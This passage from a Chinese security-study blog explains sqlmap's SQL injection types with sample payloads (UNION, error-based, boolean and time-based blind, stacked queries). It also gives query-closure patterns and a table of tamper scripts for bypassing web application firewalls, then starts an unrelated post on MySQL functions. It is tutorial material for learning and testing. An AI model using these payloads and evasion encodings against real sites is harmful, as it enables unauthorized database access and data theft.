([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_42":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="三、sqlmap的探测注入类型"><a href="#三、sqlmap的探测注入类型" class="headerlink" title="三、sqlmap的探测注入类型"></a>三、sqlmap的探测注入类型</h3><h4 id="3-1-UNION-query-SQL-injection（联合查询注入）"><a href="#3-1-UNION-query-SQL-injection（联合查询注入）" class="headerlink" title="3.1 UNION query SQL injection（联合查询注入）"></a>3.1 UNION query SQL injection（联合查询注入）</h4><p>​      联合查询就是通过union关键字将多条语句合并在一起执行，让前一条语句报错从而让后一条语句的执行结果输出到前一条语句的显位中。需要注意的是查询语句要符合1.相同列数2.相似的数据类型3.相同的编码。</p>
<p><strong>示例语句：id=-1’ union select 1,(select user()),(select version())#</strong></p>
<h4 id="3-2-Error-based-SQL-injection（基于报错型注入）"><a href="#3-2-Error-based-SQL-injection（基于报错型注入）" class="headerlink" title="3.2 Error-based SQL injection（基于报错型注入）"></a>3.2 Error-based SQL injection（基于报错型注入）</h4><p>​      报错型注入是利用了MySQL的第8652号BUG，但是用echo mysql_error();输出了错误信息时使用，</p>
<p><strong>示例语句：id=’ and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#</strong></p>
<p>当然如果报错的数据不能回显到页面上来，就无法使用报错注入，这时候我们就可以考虑是否存在盲注。</p>
<h4 id="3-3-Boolean-based-blind-SQL-injection（基于布尔型的盲注）"><a href="#3-3-Boolean-based-blind-SQL-injection（基于布尔型的盲注）" class="headerlink" title="3.3 Boolean-based blind SQL injection（基于布尔型的盲注）"></a>3.3 Boolean-based blind SQL injection（基于布尔型的盲注）</h4><p>​       布尔盲注的核心思想就是通过判断两种不同的页面状态来进一步推断注入语句是否被执行以及数据是否存在。<br><strong>示例语句：id=1’ and length(database())&gt;1 #</strong><br>​        当我们输入的注入语句无法通过回显以及报错的方式来获取数据，这时候就可能存在盲注，通过判断有跟没有、对或错来判断regexp 是否匹配到数据了。</p>
<h4 id="3-4-Time-based-blind-SQL-injection（基于时间的盲注）"><a href="#3-4-Time-based-blind-SQL-injection（基于时间的盲注）" class="headerlink" title="3.4 Time-based blind SQL injection（基于时间的盲注）"></a>3.4 Time-based blind SQL injection（基于时间的盲注）</h4><p>​       如果在测试的时候发现都不存在前面三种所说的注入，那就有可能是时间盲注，时间盲注的特点是无回显，无报错，也没有多种页面状态。这时候就需要通过增加sleep()函数来判断注入语句的执行，而布尔则是根据页面的对错来判断。</p>
<p><strong>示例语句：id=1’ and sleep(5)# 如果sleep则可以初步判断可能存在时间盲注</strong></p>
<h4 id="3-5-Stacked-queries-SQL-injection（可多语句查询注入）"><a href="#3-5-Stacked-queries-SQL-injection（可多语句查询注入）" class="headerlink" title="3.5 Stacked queries SQL injection（可多语句查询注入）"></a>3.5 Stacked queries SQL injection（可多语句查询注入）</h4><p>​        多语句查询注入也叫做堆叠查询，与联合查询有点相似，都可以多条语句查询，堆叠查询的关键是分号(;)比较直观的就是如果分号被过滤或者无法绕过就无法注入，当然还有一些数据库引擎不支持，权限不足等限制，实际工作中遇到的也很比较少，这里就不做过多讨论。</p>
<h4 id="3-6-sql注入闭合类型"><a href="#3-6-sql注入闭合类型" class="headerlink" title="3.6 sql注入闭合类型"></a>3.6 sql注入闭合类型</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span>;          <span class="comment">#这种情况下，$id变量多为数字型    不需要闭合符号，可以直接注入，但如果系统做了只能传入数字型的判断，就无法注入</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span>;        <span class="comment">#这种情况下，$id变量多为字符型    需要闭合单引号，可以用?id=1'这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">"$id"</span>;        <span class="comment">#这种情况下，$id变量多为字符型    需要闭合双引号，可以用?id=1"这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=($<span class="keyword">id</span>);        <span class="comment">#这种情况下，$id变量多为数字型    需要闭合括号，可以用?id=1)这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">'$id'</span>);      <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合单引号和括号，可以用?id=1')这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">"$id"</span>);      <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合双引号和括号，可以用?id=1")这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=((<span class="string">'$id'</span>));    <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合单引号和两层括号，可以用?id=1'))这种形式闭合</span></span><br><span class="line"></span><br><span class="line">有些语句还有limit子句，如<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;，我们可以通过上面提到的方法先闭合单引号，然后用%23，即注释符注释掉后面的语句，具体写法如下：?id=1'%23；即可闭合输出正确的语句</span><br><span class="line"></span><br><span class="line">*注：这里只列举几种常见的写法，可以结合实际情况，进行闭合符号，没有什么固定的方式，但最终达到一个目的就好了，就是闭合语句中可能有的符号，注释掉我们不需要或者可能会限制我们继续注入的部分。使得我们注入这些闭合原有语句的符号后，得到的语句还是正确并且可被执行的。</span><br></pre></td></tr></table></figure>

<h3 id="四、sqlmap的tamper参数绕过waf脚本"><a href="#四、sqlmap的tamper参数绕过waf脚本" class="headerlink" title="四、sqlmap的tamper参数绕过waf脚本"></a>四、sqlmap的tamper参数绕过waf脚本</h3><table>
<thead>
<tr>
<th><strong>支持的数据库</strong></th>
<th>编号</th>
<th>脚本名称</th>
<th>作用</th>
<th>实现方式</th>
</tr>
</thead>
<tbody><tr>
<td>all</td>
<td>1</td>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
<td>(“1 AND ‘1’=’1”)  ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td>
</tr>
<tr>
<td>all</td>
<td>2</td>
<td>base64encode.py</td>
<td>用base64编码替换</td>
<td>(“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’</td>
</tr>
<tr>
<td>all</td>
<td>3</td>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
<td>(‘1 UNION SELECT foobar’) ‘1    UNION     SELECT   foobar’</td>
</tr>
<tr>
<td>all</td>
<td>4</td>
<td>space2plus.py</td>
<td>用+替换空格</td>
<td>(‘SELECT id FROM users’) ‘SELECT+id+FROM+users’</td>
</tr>
<tr>
<td>all</td>
<td>5</td>
<td>nonrecursivereplacement.py</td>
<td>双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如  .replace（“SELECT”、””)） filters</td>
<td>(‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’</td>
</tr>
<tr>
<td>all</td>
<td>6</td>
<td>space2randomblank.py</td>
<td>代替空格字符（“”）从一个随机的空 白字符可选字符的有效集</td>
<td>(‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’</td>
</tr>
<tr>
<td>all</td>
<td>7</td>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
<td>(‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’</td>
</tr>
<tr>
<td>all</td>
<td>8</td>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
<td>(‘1 AND 1=1’) “1 AND 1=1 and ‘0having’=’0having’”</td>
</tr>
<tr>
<td>mssql</td>
<td>1</td>
<td>space2hash.py</td>
<td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
<td>‘1 AND 9227=9227’  ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td>
</tr>
<tr>
<td>mssql</td>
<td>2</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id=1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
</tr>
<tr>
<td>mssql</td>
<td>3</td>
<td>space2mssqlblank.py(mssql)</td>
<td>空格替换为其它空符号</td>
<td>Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers</td>
</tr>
<tr>
<td>mssql</td>
<td>4</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td>mssql</td>
<td>5</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>mssql</td>
<td>6</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>mssql</td>
<td>7</td>
<td>sp_password.py</td>
<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
<td>(‘1 AND 9227=9227– ‘) ‘1 AND 9227=9227– sp_password’</td>
</tr>
<tr>
<td>mssql</td>
<td>8</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>mssql</td>
<td>9</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>mssql</td>
<td>10</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>mssql</td>
<td>11</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>1</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id=1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>2</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>3</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>4</td>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
<td>(‘IFNULL(1, 2)’) ‘IF(ISNULL(1),2,1)’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>5</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>6</td>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!30874AND 2&gt;1</em>/–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>7</td>
<td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
<td>Input: SELECT id FROM users Output: SELECT%0Bid%0BFROM%A0users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>8</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>9</td>
<td>modsecurityzeroversioned.py</td>
<td>包含了完整的查询与零版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!00000AND 2&gt;1</em>/–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>10</td>
<td>space2mysqldash.py</td>
<td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
<td>(‘1 AND 9227=9227’) ‘1–%0AAND–%0A9227=9227’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>11</td>
<td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
<td>(‘SELECT id FROM users where id = 1’) ‘SELECT%09id FROM users where id LIKE 1’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>12</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>13</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>14</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>15</td>
<td>versionedkeywords.py</td>
<td>Encloses each non-function keyword with versioned MySQL comment</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>16</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>17</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>18</td>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# * Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</td>
</tr>
<tr>
<td>MySQL &lt; 5.1</td>
<td>19</td>
<td>halfversionedmorekeywords.py</td>
<td>关键字前加注释</td>
<td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa * Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td>
</tr>
<tr>
<td>MySQL &lt; 5.1</td>
<td>20</td>
<td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论</td>
<td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”) 2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</td>
</tr>
<tr>
<td>MySQL &gt;= 5.1.13</td>
<td>21</td>
<td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
<td>* Input: 1 AND 9227=9227 * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td>
</tr>
<tr>
<td>Oracle</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>Oracle</td>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>Oracle</td>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>Oracle</td>
<td>4</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>Oracle</td>
<td>5</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>Oracle</td>
<td>6</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>Oracle</td>
<td>7</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>4</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>5</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>6</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>7</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>8</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>Access</td>
<td>1</td>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
<td>(‘1 AND 1=1’) ‘1 AND 1=1%00’</td>
</tr>
<tr>
<td>其他</td>
<td>1</td>
<td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
</tr>
<tr>
<td>其他</td>
<td>2</td>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC  addslashes</td>
<td>* Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%20</td>
</tr>
<tr>
<td>其他</td>
<td>3</td>
<td>randomcomments.py</td>
<td>用/**/分割sql关键字</td>
<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
</tr>
</tbody></table>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/54774043" target="_blank" rel="noopener">https://blog.csdn.net/whatday/article/details/54774043</a></p>
<p><a href="https://www.freebuf.com/articles/web/34619.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/34619.html</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/09/MySql内置函数学习-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/09/MySql内置函数学习-4/" itemprop="url">MySql内置函数学习------第四周学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-09T16:55:34+08:00">
                2019-09-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/09/MySql内置函数学习-4/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/09/MySql内置函数学习-4/" class="cy_cmt_count" data-xid="2019/09/09/MySql内置函数学习-4/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/09/MySql内置函数学习-4/" class="leancloud_visitors" data-flag-title="MySql内置函数学习------第四周学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="MySql内置函数学习——第四周学习"><a href="#MySql内置函数学习——第四周学习" class="headerlink" title="MySql内置函数学习——第四周学习"></a>MySql内置函数学习——第四周学习</h2><p>mysql含有的内置函数分别为<strong>字符串函数、数字函数、日期函数、类型转换函数、流程控制函数</strong>。</p>
<h5 id="1-字符串函数"><a href="#1-字符串函数" class="headerlink" title="1.字符串函数"></a>1.字符串函数</h5><p>1.1 查询ascii码的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(1);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566366553415.png" alt="1566366553415"></p>
